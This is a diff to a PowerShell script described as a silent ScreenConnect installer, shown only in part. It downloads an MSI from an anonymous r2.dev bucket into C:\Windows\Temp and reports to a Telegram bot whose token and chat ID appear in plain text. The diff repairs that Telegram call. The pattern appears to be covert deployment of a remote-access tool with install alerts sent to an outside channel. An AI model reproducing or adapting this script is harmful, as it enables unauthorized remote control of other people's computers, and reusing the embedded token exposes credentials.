@@ -3,7 +3,7 @@
 # Description: Fixed ScreenConnect silent installer with UTF-8 Telegram fix
 # ==============================================================================
 
-# Force PowerShell output to treat text as UTF-8 (Fixes the Ã¢Â Å’ corrupted characters)
+# Force PowerShell output to treat text as UTF-8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
@@ -11,8 +11,8 @@ $OutputEncoding = [System.Text.Encoding]::UTF8
 $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
-# 2. APPLICATION CONFIGURATION - YOUR NEW LINK IS PLACED HERE
-$MsiUrl    = "https://pub-14dda660d9ed46a491b2c11bd2890715.r2.dev/ScreenConnect.ClientSetup.msi"
+# 2. APPLICATION CONFIGURATION
+$MsiUrl    = "https://pub-14dda660d9ed46a491b2c11bd2890715.r2.dev/ScreenConnect.ClientSetup(1).msi"
 $TempDir   = "C:\Windows\Temp"
 $MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
 $LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
@@ -30,7 +30,7 @@ function Send-TelegramAlert {
             text    = $Message
         } | ConvertTo-Json -Compress -Depth 2
 
-        Invoke-RestMethod -Uri "https://telegram.org" `
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                           -Method Post `
                           -ContentType "application/json; charset=utf-8" `
                           -Body $Payload -ErrorAction Stop | Out-Null
